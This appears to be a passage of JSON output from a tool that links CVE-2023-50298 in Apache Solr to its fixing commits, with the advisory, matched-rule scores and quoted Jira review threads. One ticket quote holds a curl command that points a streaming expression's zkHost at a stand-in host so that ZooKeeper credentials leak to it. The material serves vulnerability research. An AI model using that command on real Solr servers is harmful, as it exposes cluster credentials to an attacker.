{
    "parameters": {
        "vulnerability_id": "CVE-2023-50298",
        "repository_url": "https://github.com/apache/lucene-solr",
        "version_interval": "9.0.0:9.4.1",
        "use_backend": "always",
        "backend_address": "http://backend:8000",
        "git_cache": "/data/gitcache",
        "limit_candidates": 2000,
        "use_llm_repository_url": true,
        "enabled_rules": [
            "VULN_ID_IN_MESSAGE",
            "XREF_BUG",
            "XREF_GH",
            "COMMIT_IN_REFERENCE",
            "VULN_ID_IN_LINKED_ISSUE",
            "CHANGES_RELEVANT_FILES",
            "CHANGES_RELEVANT_CODE",
            "RELEVANT_WORDS_IN_MESSAGE",
            "ADV_KEYWORDS_IN_FILES",
            "ADV_KEYWORDS_IN_MSG",
            "SEC_KEYWORDS_IN_MESSAGE",
            "SEC_KEYWORDS_IN_LINKED_GH",
            "SEC_KEYWORDS_IN_LINKED_BUG",
            "GITHUB_ISSUE_IN_MESSAGE",
            "BUG_IN_MESSAGE",
            "COMMIT_HAS_TWINS",
            "COMMIT_IS_SECURITY_RELEVANT"
        ]
    },
    "advisory_record": {
        "cve_id": "CVE-2023-50298",
        "description": "Exposure of Sensitive Information to an Unauthorized Actor vulnerability in Apache Solr.This issue affects Apache Solr: from 6.0.0 through 8.11.2, from 9.0.0 before 9.4.1.\n\nSolr Streaming Expressions allows users to extract data from other Solr Clouds, using a \"zkHost\" parameter.\nWhen original SolrCloud is setup to use ZooKeeper credentials and ACLs, they will be sent to whatever \"zkHost\" the user provides.\nAn attacker could setup a server to mock ZooKeeper, that accepts ZooKeeper requests with credentials and ACLs and extracts the sensitive information,\nthen send a streaming expression using the mock server's address in \"zkHost\".\nStreaming Expressions are exposed via the \"/streaming\" handler, with \"read\" permissions.\n\nUsers are recommended to upgrade to version 8.11.3 or 9.4.1, which fix the issue.\nFrom these versions on, only zkHost values that have the same server address (regardless of chroot), will use the given ZooKeeper credentials and ACLs when connecting.\n\n",
        "reserved_timestamp": 1701890511,
        "published_timestamp": 1707499747,
        "updated_timestamp": 1724084310,
        "repository_url": null,
        "references": {
            "": 79,
            "https://solr.apache.org/security.html#cve-2023-50298-apache-solr-can-expose-zookeeper-credentials-via-streaming-expressions": 6,
            "http://www.openwall.com/lists/oss-security/2024/02/09/3": 4,
            "http://www.openwall.com/lists/oss-security/2024/02/09/2": 4,
            "https://www.openwall.com/lists/oss-security/2024/02/09/2": 2,
            "https://www.apache.org/security/": 2,
            "https://cwiki.apache.org/confluence/display/SOLR/SolrSecurity": 2,
            "https://nvd.nist.gov/vuln/detail/CVE-2024-31391": 2,
            "https://nvd.nist.gov/vuln/detail/CVE-2023-50291": 2,
            "https://nvd.nist.gov/vuln/detail/CVE-2023-50292": 2,
            "https://nvd.nist.gov/vuln/detail/CVE-2023-50298": 2,
            "https://nvd.nist.gov/vuln/detail/CVE-2023-50386": 2,
            "https://nvd.nist.gov/vuln/detail/CVE-2023-50290": 2,
            "https://nvd.nist.gov/vuln/detail/CVE-2022-39135": 2,
            "https://logging.apache.org/log4j/2.x/security.html": 2,
            "https://issues.apache.org/jira/browse/SOLR-15217": 2,
            "https://issues.apache.org/jira/browse/SOLR-15249": 2,
            "https://issues.apache.org/jira/browse/SOLR-15233": 2,
            "https://nvd.nist.gov/vuln/detail/CVE-2018-10237": 2,
            "https://nvd.nist.gov/vuln/detail/CVE-2017-14952": 2,
            "https://nvd.nist.gov/vuln/detail/CVE-2018-1335": 2,
            "https://nvd.nist.gov/vuln/detail/CVE-": 2,
            "https://solr.apache.org/community.html#mailing-lists-chat": 1,
            "https://solr.apache.org/downloads.html": 1,
            "https://cyclonedx.org/capabilities/vex/": 1,
            "https://github.com/oasis-tcs/csaf/blob/master/csaf_2.0/prose/csaf-v2-editor-draft.md#45-profile-5-vex": 1,
            "https://www.apache.org/foundation/mailinglists.html": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2021-44548": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2021-44228": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2021-27905": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2021-29262": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2021-29943": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2020-13957": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2020-13941": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2019-17558": 1,
            "https://issues.apache.org/jira/browse/SOLR-17216": 1,
            "https://issues.apache.org/jira/browse/SOLR-16809": 1,
            "https://issues.apache.org/jira/browse/SOLR-16777": 1,
            "https://issues.apache.org/jira/browse/SOLR-17098": 1,
            "https://issues.apache.org/jira/browse/SOLR-16949": 1,
            "https://issues.apache.org/jira/browse/SOLR-16808": 1,
            "https://issues.apache.org/jira/browse/SOLR-16421": 1,
            "https://issues.apache.org/jira/browse/SOLR-15826": 1,
            "https://github.com/apache/logging-log4j2/pull/608#issuecomment-990494126": 1,
            "https://cwiki.apache.org/confluence/display/SOLR/SolrSecurity#SolrSecurity-SolrandVulnerabilityScanningTools": 1,
            "https://hub.docker.com/_/solr": 1,
            "https://lists.apache.org/thread/kgh63sncrsm2bls884pg87mnt8vqztmz": 1,
            "https://solr.apache.org/guide/8_6/configsets-api.html": 1,
            "https://solr.apache.org/guide/8_6/authentication-and-authorization-plugins.html": 1,
            "https://issues.apache.org/jira/browse/SOLR-14663": 1,
            "https://issues.apache.org/jira/browse/SOLR-14925": 1,
            "https://issues.apache.org/jira/browse/SOLR-13971": 1,
            "https://issues.apache.org/jira/browse/SOLR-14025": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2022-33980": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2022-42889": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2022-25168": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2021-44832": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2021-45105": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2021-45046": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2020-13955": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2014-0114": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2019-10086": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2012-2098": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2018-1324": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2018-11771": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2018-1000632": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2017-15718": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2017-15095": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2017-17485": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2017-7525": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2018-5968": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2018-7489": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2019-12086": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2019-12384": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2018-12814": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2019-14379": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2019-14439": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2020-35490": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2020-35491": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2021-20190": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2019-14540": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2019-16335": 1,
            "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2019-10241": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2019-10247": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2020-27218": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2020-27223": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2021-33813": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2018-1000056": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2014-7940": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2016-6293": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2016-7415": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2017-17484": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2017-7867": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2017-7868": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2019-16869": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2017-14868": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2017-14949": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2015-5237": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2018-1471": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2018-8088": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2016-6809": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2018-1338": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2018-1339": 1,
            "https://github.com/Gagravarr/VorbisJava/issues/30": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2012-0881": 1,
            "https://nvd.nist.gov/vuln/detail/CVE-2023-51074": 1,
            "https://www.apache.org/": 1,
            "https://www.apache.org/foundation/thanks.html": 1,
            "https://www.apache.org/foundation/sponsorship.html": 1,
            "https://www.apache.org/licenses/": 1,
            "http://lucene.apache.org/": 1,
            "http://zookeeper.apache.org/": 1,
            "http://tika.apache.org/": 1,
            "http://manifoldcf.apache.org/": 1,
            "http://spark.apache.org/": 1,
            "http://nutch.apache.org/": 1,
            "http://zeppelin.apache.org/": 1,
            "http://opennlp.apache.org/": 1,
            "https://www.apache.org/licenses/LICENSE-2.0": 1,
            "https://privacy.apache.org/policies/privacy-policy-public.html": 1,
            "https://www.apache.org/foundation/marks/": 1
        },
        "affected_products": [
            "Streaming",
            "ZooKeeper",
            "Unauthorized",
            "SolrCloud",
            "Information",
            "Actor",
            "Expressions",
            "Sensitive",
            "Solr",
            "Clouds",
            "Apache Solr"
        ],
        "versions": {
            "lessThanOrEqual": "8.11.2",
            "status": "affected",
            "version": "6.0.0",
            "versionType": "semver"
        },
        "files": [
            "This",
            "ZooKeeper",
            "SolrCloud",
            "Solr",
            "ACLs",
            "zkHost"
        ],
        "keywords": [
            "request",
            "stream",
            "read",
            "upgrade",
            "apache",
            "issue",
            "solrcloud",
            "handler",
            "address",
            "information",
            "exposure",
            "version",
            "solr",
            "user",
            "credential",
            "allow",
            "sensitive",
            "affect",
            "expression",
            "recommend",
            "accept",
            "unauthorized",
            "value",
            "clouds",
            "server",
            "have",
            "provide",
            "connect",
            "expressions",
            "zookeeper",
            "send",
            "parameter",
            "permission",
            "attacker",
            "setup",
            "streaming",
            "give",
            "actor",
            "extract",
            "datum",
            "vulnerability",
            "expose",
            "chroot"
        ],
        "files_extension": [],
        "has_fixing_commit": false
    },
    "commits": [
        {
            "commit_id": "61c956c426b2cfb85ccef55d1afca4335eacd269",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1701804925,
            "hunks": 30,
            "message": "SOLR-17098: Only use ZK ACLs for default ZK Host (cherry picked from commit e2bf1f434aad873fbb24c21d46ac00e888806d98)",
            "changed_files": [
                "solr/core/src/java/org/apache/solr/core/CoreContainer.java",
                "solr/solr-ref-guide/src/stream-decorator-reference.adoc",
                "solr/solr-ref-guide/src/stream-source-reference.adoc",
                "solr/solrj/src/java/org/apache/solr/client/solrj/impl/CloudHttp2SolrClient.java",
                "solr/solrj/src/java/org/apache/solr/client/solrj/impl/CloudSolrClient.java",
                "solr/solrj/src/java/org/apache/solr/client/solrj/impl/ZkClientClusterStateProvider.java",
                "solr/solrj/src/java/org/apache/solr/client/solrj/io/SolrClientCache.java",
                "solr/solrj/src/java/org/apache/solr/common/cloud/SolrZkClient.java",
                "solr/solrj/src/java/org/apache/solr/common/cloud/ZkStateReader.java",
                "solr/solrj/src/test-files/solrj/solr/solr.xml"
            ],
            "message_reference_content": [],
            "jira_refs": {
                "SOLR-17098": "Security list thread: https://lists.apache.org/thread/byrxkqk15mh6960wmx4r851srosgkvbh ZK Credentials and ACLs can be exposed to any endpoint when the Streaming Handler is used: curl --data-urlencode 'expr=search(collection1, zkHost=\"target:2121\", qt=\"/export\", q=\" : \", fl=\"id,a_s,a_i,a_f\", sort=\"a_f asc, a_i asc\")' http://localhost:8983/solr/demo/stream In the command above, if the Solr instance has any Zookeeper Credentials or ACLs provided, then that information will be sent to the \"target:2121\" address. An attacker could set up a mock Zookeeper service to obtain the credentials, and then gain access to the Solr's Zookeeper Nodes. Zookeeper Credential Information Disclosure bug via Streaming Expressions Have a patch ready to test out. It works across all uses of the SolrClientCache, so hopefully there won't be any gaps we need to plugin in the future. Thanks for working on this!  Feel free to at-mention me next time.  I would have responded earlier in the month. I applied the patch to IntelliJ and also ran the tests via Crave CLI invocation (all passed; 6m 43sec) CloudSolrStream: you initialize ignoreZkACLs boolean but never use it (thanks IntelliJ for pointing this out) TupleStream: can remove your only edit; it was just for a newline SolrClientCache: here you used zkHost::contains but shouldn't this be zkHost::equals ?  Should match the host exactly, not partially. Thanks for finding the first two, removed both as they were from earlier implementations. The SolrClientCache used contains to make sure that other chRoots could still use the ACLs, because that's not a security issue. However yeah contains was the wrong way to do it. I changed it to \"equals\" after removing chRoots. New patch should be good to go? This works.  +1 In retrospect, I don't love that this approach introduces ignoreZkACLs in a number of places; it takes some review to understand what's going on and it seems yet another small wrinkle of complexity on things.  It's an exotic option. An alternative approach is to try to isolate the entire change to SolrZkClient.createZkCredentialsToAddAutomatically, where zkCredentialsProvider is loaded and is itself an exotic option as well.  The zkServer would be passed in to that method.  But it's unclear how that method would know if the zkServer is the one (or ones?) to which the zkCredentialsProvider applies.  So a half-baked idea.  Maybe it would require whatever the sys prop that identifies ZK being set and equivalent to the arg. Perhaps ZkCredentialsInjector's API (or its collaborator APIs) are missing an argument that ought to be there \u2013 the zkServer. Any way I did +1. Yeah unfortunately all of the ZkCredentialsInjector stuff is a part of SolrJ-Zookeeper, and thus doesn't really have any knowledge of the Solr Core's Zookeeper address. So we'd have to pass through that info anyways. I'll move forward so this won't block the patch releases, we can always improve it in the future. houston , anything needed to get this over the finish line?  This is the only block for 9.4.1 https://issues.apache.org/jira/issues/?jql=project%20%3D%20SOLR%20AND%20resolution%20%3D%20Unresolved%20AND%20fixVersion%20%3D%209.4.1%20%20ORDER%20BY%20priority%20DESC%2C%20updated%20DESC This has been backported to 9.4.1, but it hasn't been backported to 8.11.3 yet, so it's not marked as Done. You should be good to move forward with 9.4.1 This has been backported to branch_8_11 now. All backporting should be done. Closing after the 9.4.1 release"
            },
            "ghissue_refs": {},
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "COMMIT_IS_SECURITY_RELEVANT",
                    "message": "",
                    "relevance": 32
                },
                {
                    "id": "XREF_BUG",
                    "message": "The commit and the advisory (including referenced pages) mention the same bug tracking ticket: SOLR-17098",
                    "relevance": 32
                },
                {
                    "id": "RELEVANT_WORDS_IN_MESSAGE",
                    "message": "The commit message contains some relevant words: ACLs",
                    "relevance": 8
                },
                {
                    "id": "CHANGES_RELEVANT_CODE",
                    "message": "The commit modifies code containing relevant filename or methods: This, ZooKeeper, Solr, ACLs, zkHost",
                    "relevance": 8
                },
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/solrj/src/java/org/apache/solr/client/solrj/io/SolrClientCache.java, solr/solr-ref-guide/src/stream-decorator-reference.adoc, solr/core/src/java/org/apache/solr/core/CoreContainer.java, solr/solrj/src/java/org/apache/solr/client/solrj/impl/CloudHttp2SolrClient.java, solr/solrj/src/java/org/apache/solr/common/cloud/ZkStateReader.java, solr/solrj/src/test-files/solrj/solr/solr.xml, solr/solrj/src/java/org/apache/solr/common/cloud/SolrZkClient.java, solr/solr-ref-guide/src/stream-source-reference.adoc, solr/solrj/src/java/org/apache/solr/client/solrj/impl/ZkClientClusterStateProvider.java, solr/solrj/src/java/org/apache/solr/client/solrj/impl/CloudSolrClient.java",
                    "relevance": 8
                },
                {
                    "id": "SEC_KEYWORDS_IN_LINKED_BUG",
                    "message": "The bug tracking ticket SOLR-17098 contains some security-related terms: security",
                    "relevance": 4
                },
                {
                    "id": "ADV_KEYWORDS_IN_FILES",
                    "message": "An advisory keyword is contained in the changed files: read, stream, provide, clouds",
                    "relevance": 4
                },
                {
                    "id": "BUG_IN_MESSAGE",
                    "message": "The commit message references some bug tracking ticket: SOLR-17098",
                    "relevance": 2
                }
            ]
        },
        {
            "commit_id": "4ac1d59918c250bffb09899572bd92054cee063a",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1682778169,
            "hunks": 1,
            "message": "SOLR-16777: Fix for Schema Designer blindly trusting potentially malicious configsets",
            "changed_files": [
                "solr/core/src/java/org/apache/solr/handler/designer/SchemaDesignerConfigSetHelper.java"
            ],
            "message_reference_content": [],
            "jira_refs": {
                "SOLR-16777": "When configset API is used to upload configsets by unauthenticated users, a \"trusted: false\" flag is set on the configset. Such configsets cannot use the <lib> directive to load classes while creating/loading collections. Details here: https://solr.apache.org/guide/8_10/configsets-api.html#configsets-upload Unfortunately, this safety mechanism was bypassed in the schema designer when a isConfigsetTrusted was hardcoded to true. https://github.com/apache/solr/blob/branch_9_1/solr/core/src/java/org/apache/solr/handler/designer/SchemaDesignerConfigSetHelper.java#L697 As per Skay's report https://twitter.com/Skay_00/status/1646870062601756672 remote code execution is possible in unsecured Solr clusters where authentication hasn't been enabled. This ticket is to mitigate one aspect of that, i.e. the schema designer vulnerability. While our recommendation to all users remains the same, i.e. to secure Solr installations with authentication and authorization, I thank Skay for his detailed report. Schema Designer blindly \"trusts\" potentially malicious configset Attaching a patch to fix this. All tests pass. I'm planning to commit this soon, would love to have someone review it. LGTM. go ahead and merge please Commit bf9ca1044b2eec234038c2c27ec7996d589bb8c8 in solr's branch refs/heads/main from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=solr.git;h=bf9ca1044b2 ] SOLR-16777 : Fix for Schema Designer blindly trusting potentially malicious configsets Commit 17b32f9b59094cda22e9e43236c97a575a7e16a0 in solr's branch refs/heads/branch_9x from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=solr.git;h=17b32f9b590 ] SOLR-16777 : Fix for Schema Designer blindly trusting potentially malicious configsets Commit 0333862ad289d9f73c7c96e1d26ebe15e506a4aa in solr's branch refs/heads/branch_9_2 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=solr.git;h=0333862ad28 ] SOLR-16777 : Fix for Schema Designer blindly trusting potentially malicious configsets Thanks Skay, for reporting the bug as well as pointing towards the area of code containing the bug in your blog post! I have a question about the patch. Does this mean that everything the schema designer can never trust anything, even if it was uploaded by a trusted user? gus True. All unsafe features are disabled for any config that is uploaded over an API call Does this mean that everything the schema designer can never trust anything, even if it was uploaded by a trusted user? Yes. That is against the documentation for the trusted config set feature. I think the code should be determining if the user is trusted and then passing the correct value. Either one every time is wrong. The behavior should match config set upload. It's terribly confusing if nobody (trusted or untrusted) can use schema designer just because someone (trusted) uploaded a config set that requires trust previously... Because if the existing config that is being edited has \"trust required\" features\u00a0 and the user is editing something benign and unrelated to the \"trust required\" feature, this call will fail (unless I misunderstand) I think the code should be determining if the user is trusted and then passing the correct value. Sure, please feel free to re-open and add the check here. I hope all of this will become a non-issue once <lib> directives are gone ( SOLR-16781 ). Commit 9a4f4fff1cca1590eb039b521fb3f10abbdb62b3 in solr's branch refs/heads/branch_9_2 from Jan H\u00f8ydahl [ https://gitbox.apache.org/repos/asf?p=solr.git;h=9a4f4fff1cc ] SOLR-16777 Move changes entry from 9.2.1 to 9.2.2 Signed-off-by: Jan H\u00f8ydahl <janhoy@users.noreply.github.com> https://solr.apache.org/guide/solr/latest/configuration-guide/configsets-api.html#configsets-upload specifies two other features that also are only available with trusted configsets. <lib> is not the only issue. So unless the whole trusted config set feature is going away hard-coding a value seems to create a trap for the user. I don't have time to work on this right now, but I'm -1 on anything that makes schema designer (or any other feature) fail for unclear reasons. If the error message is clear enough, and the ref guide is updated to clarify the incompatibility of the listed \"trusted\" features with schema designer and we commit to doing something nicer in 9.3 I'll change that to -0.9, but it would be much better to be consistent with the existing feature. Security is important,\u00a0 but we shouldn't make our software trappy and hard to use either. security is not optional . Unsafe features should be removed as and when we find them I don't think this makes schema designer unusable at all. This is an extremely obscure feature that's carried forward from non cloud Solr Of course it's not optional, but usability isn't optional either. The fact that security is more important is why I am willing to put up with a well documented gotcha for the short term. Which feature are you referring to as carried forward. Schema designer appeared in 8.10 and trusted configsets first showed up\u00a0 in 8.4? (in documentation at least, I haven't figured out if trusted configsets were undocumented for a while before that) <lib> and other unsafe features mentioned in the configset upload API will generate an error (with the reason) when loaded from untrusted configsets. Those features shouldn't be used anyway, so if they dont work with schema designer, it is not the end of the world. Which feature are you referring to as carried forward I guess he's referring to <lib> and other insecure features (stateless script update processor?) etc. Also, the overlap of users using such obscure and advanced features and those using the schema designer will probably be negligible. Re-opening to make sure either Document in ref-guide that Schema Designer now can ONLY work on untrusted config sets OR Toggle safe/unsafe based on whether the call is authorized, like is done for configset-api +1 to what Gus said, and Jan's decision to reopen. Sure, please feel free to re-open and add the check here. Procedurally, responding to review this way feels...maybe not \"wrong\", but at least \"odd\".  And maybe even slightly harmful? Obviously I'm not saying every last review comment needs addressed.  Some are too minor or loosely held even by the reviewer.  Often there's competing views, or a suggestion might deserve its own spinoff ticket, etc.  That stuff happens all the time. But to seemingly agree after a few back-and-forth's (or at least acquiesce?) and still not incorporate the feedback - with no explanation - just feels a little weird.  It discounts the time Gus and others put in to their reviews.  And, longer term, it'd be natural for anyone reading here to hesitate before giving you a review the next time around.  Which, it goes without saying, hurts everyone. ichattopadhyaya could you please at least explain why you don't care to incorporate Gus' feedback? Jason, please stop being so melodramatic. I'm on travel at the moment. I'll pick it up when I get some time. This is a volunteer driven project, so feel free to do something you expect me to do (which I will do). Btw, I agree with Jan's suggestion. I think we should rather add the check than explain why we don't. Fyi, Jason \ud83d\ude0a I think we should rather add the check than explain why we don't. +1 Jason, please stop being so melodramatic. I'm on travel at the moment Apologies for the \"melodrama,\" if that's how my comment came off.  I wasn't trying to make a bigger thing of it than it is. I've been thinking a lot lately about how it's the unwritten rules and norms that allow our community to work at all.  How we incorporate feedback is one of those.  Those norms are just so, so important.  That's all I was trying to get across. (And related - I think you're right - as important as it is, it's hard to elucidate or appeal to that sort of stuff without sounding like a crazy person catastrophizing or being melodramatic with some minuscule detail \ud83d\ude2c. So, I get that haha.) Anyways, I appreciate your clarifying that you intended to get to it in time .  That's perfect. Have a safe trip! Any conclusion on this? It currently blocks 9.2.2 I'll take a look at this, latest by Thursday this week; Hopefully, that will be before the 9.3 release. I added a patch that should use the built-in trustedness of the configSet being used, when designing with the schema designer. If the user uploads a custom file to the configSet using the schema designer APIs, it can only remove the trust (if the user is not authenticated). It can never add trust to an untrusted configSet, because there is no way to replace all files using the schema designer APIs. (And we aren't going to give a whole configSet trust just because one file is now \"trusted\") I'm trying to get a release candidate out soon, so would appreciate anyone that could review the patch! The patch LGTM, with the small quibble that maybe we should document the \"final\" behavior around Schema Designer and trusted-ness in the ref-guide somewhere? LGTM. Summarized changes: ZkConfigSetService.java: The method signature of loadConfigSetFlags was modified to remove the CoreDescriptor parameter. ConfigSetService.java: Import of ZkSolrResourceLoader was removed. Two methods, isConfigSetTrusted(String name) and isConfigSetTrusted(SolrResourceLoader coreLoader), were added to check whether a given config set or a config set associated with a resource loader is trusted. In the loadConfigSet method, the check for a trusted config set was replaced with a call to the new isConfigSetTrusted method. The createSolrConfig method was updated to use the isConfigSetTrusted method for the trusted argument. The loadConfigSetFlags method was modified, similar to the change in ZkConfigSetService.java, to remove the CoreDescriptor parameter. ConfigSetAPIBase.java: The isTrusted method was made static, and its visibility was changed to public. The isCurrentlyTrusted method was removed. The method ensureOverwritingUntrustedConfigSet was updated to use configSetService.isConfigSetTrusted(configName) instead of isCurrentlyTrusted(configName). CreateConfigSetAPI.java: Updated to use configSetService.isConfigSetTrusted(createConfigPayload.baseConfigSet) instead of isCurrentlyTrusted(createConfigPayload.baseConfigSet). UploadConfigSetAPI.java: Updated to use configSetService.isConfigSetTrusted(configSetName) instead of isCurrentlyTrusted(configSetName). SchemaDesignerAPI.java: Updated to use the static isTrusted method from ConfigSetAPIBase.java. Also added logic to remove the trusted flag on the configSet if the request is untrusted. SchemaDesignerConfigSetHelper.java: Updated to load the Solr config with the trusted flag retrieved from isConfigSetTrusted. Added isConfigSetTrusted and removeConfigSetTrust methods. Trust is now determined based on the config set itself rather than on the loading process, and checks for trust have been centralized in the ConfigSetService class. Thank you very much, houston , for getting to this! I skimmed through the changes (still too busy to find time for a thorough review), and they look reasonable. Ok I cleaned it up a bit more and added docs. Will commit soon, after the tests pass. So we are going to need an 8.11.2 release for this, correct? I can volunteer for an 8x release containing this, immediately after 9.3 is out. Thanks Houston! Commit 35d352522df046aab9035d60806ababffa0f00e8 in solr's branch refs/heads/main from Houston Putman [ https://gitbox.apache.org/repos/asf?p=solr.git;h=35d352522df ] SOLR-16777 : Make SchemaDesigner use ConfigSet trust Commit 6b6e45a7c6e4f08fe1db951164ddab93809459db in solr's branch refs/heads/branch_9x from Houston Putman [ https://gitbox.apache.org/repos/asf?p=solr.git;h=6b6e45a7c6e ] SOLR-16777 : Make SchemaDesigner use ConfigSet trust (cherry picked from commit 35d352522df046aab9035d60806ababffa0f00e8) Commit d07751cfaa8065bea8bd43f59e758e50d50c2419 in solr's branch refs/heads/branch_9_3 from Houston Putman [ https://gitbox.apache.org/repos/asf?p=solr.git;h=d07751cfaa8 ] SOLR-16777 : Make SchemaDesigner use ConfigSet trust (cherry picked from commit 35d352522df046aab9035d60806ababffa0f00e8) Closing after the 9.3.0 release Hi, was it fixed int he 8.11 line as well? No. I created backporting this as a blocker for 8.11.3: SOLR-16948 Commit 4ac1d59918c250bffb09899572bd92054cee063a in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=4ac1d59918c ] SOLR-16777 : Fix for Schema Designer blindly trusting potentially malicious configsets The other fix here by Houston is still remaining. Working on it. houston , can you please review my changes to https://github.com/apache/lucene-solr/tree/jira/solr-16777-8x-backport branch? Patch file is here: https://github.com/apache/lucene-solr/commit/f9fdfc3863d436829e925acd2157e356205af929.diff I'm unable to raise a PR for it, GitHub shows me the following error: Pull request creation failed. Validation failed: must be a collaborator I wasn't able to port all the refactoring that the config sets codepaths has received in 9x, so doing a targeted fix here. That looks good, except that SchemaDesignerSettingsDAO.getSettings() is missing its change. Thanks for the quick review, Houston. Here's remaining change (another commit on the same branch): https://github.com/apache/lucene-solr/commit/a01567b6e5f49e9b9760c07d2c5db40e1255b150.diff +1 if everything passes Commit 6e9ed203b30958396bdfd41760d426b386646865 in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=6e9ed203b30 ] SOLR-16777 : Schema Designer now correctly manages trust of the ConfigSets it is managing Co-authored-by: Houston Putman <houston@apache.org>"
            },
            "ghissue_refs": {},
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "COMMIT_IS_SECURITY_RELEVANT",
                    "message": "",
                    "relevance": 32
                },
                {
                    "id": "XREF_BUG",
                    "message": "The commit and the advisory (including referenced pages) mention the same bug tracking ticket: SOLR-16777",
                    "relevance": 32
                },
                {
                    "id": "CHANGES_RELEVANT_CODE",
                    "message": "The commit modifies code containing relevant filename or methods: Solr",
                    "relevance": 8
                },
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/core/src/java/org/apache/solr/handler/designer/SchemaDesignerConfigSetHelper.java",
                    "relevance": 8
                },
                {
                    "id": "SEC_KEYWORDS_IN_LINKED_BUG",
                    "message": "The bug tracking ticket SOLR-16777 contains some security-related terms: unsafe, secure, security, insecure, malicious",
                    "relevance": 4
                },
                {
                    "id": "SEC_KEYWORDS_IN_MESSAGE",
                    "message": "The commit message contains some security-related keywords: malicious",
                    "relevance": 4
                },
                {
                    "id": "ADV_KEYWORDS_IN_FILES",
                    "message": "An advisory keyword is contained in the changed files: handler",
                    "relevance": 4
                },
                {
                    "id": "BUG_IN_MESSAGE",
                    "message": "The commit message references some bug tracking ticket: SOLR-16777",
                    "relevance": 2
                }
            ]
        },
        {
            "commit_id": "6e9ed203b30958396bdfd41760d426b386646865",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1699036210,
            "hunks": 18,
            "message": "SOLR-16777: Schema Designer now correctly manages trust of the ConfigSets it is managing Co-authored-by: Houston Putman <houston@apache.org>",
            "changed_files": [
                "solr/core/src/java/org/apache/solr/handler/admin/ConfigSetsHandler.java",
                "solr/core/src/java/org/apache/solr/handler/designer/SchemaDesignerAPI.java",
                "solr/core/src/java/org/apache/solr/handler/designer/SchemaDesignerConfigSetHelper.java",
                "solr/core/src/java/org/apache/solr/handler/designer/SchemaDesignerSettingsDAO.java"
            ],
            "message_reference_content": [],
            "jira_refs": {
